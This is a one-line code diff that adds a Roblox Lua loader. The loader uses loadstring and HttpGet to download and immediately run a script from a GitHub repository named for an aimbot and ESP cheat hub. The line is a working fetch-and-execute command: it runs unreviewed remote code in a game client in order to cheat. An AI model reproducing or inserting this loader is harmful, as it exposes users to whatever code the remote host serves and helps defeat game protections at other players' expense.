@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/break1ct/Break-Hub/refs/heads/main/Aimbot%20/ESP/BREAK%20HUB"))()
